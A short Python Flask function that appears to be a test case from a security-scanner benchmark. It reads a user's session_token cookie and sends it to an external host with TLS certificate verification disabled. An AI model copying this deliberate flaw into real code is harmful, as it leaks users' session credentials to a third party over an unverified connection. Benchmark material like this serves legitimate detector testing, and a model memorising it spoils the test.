# SPDX-License-Identifier: Apache-2.0
from flask import request, jsonify
import requests


class RequestContext:
    def __init__(self, payload):
        self.payload = payload

def BenchmarkTest74907():
    cookie_value = request.cookies.get('session_token', '')
    ctx = RequestContext(cookie_value)
    data = ctx.payload
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
    return jsonify({"result": "success"})
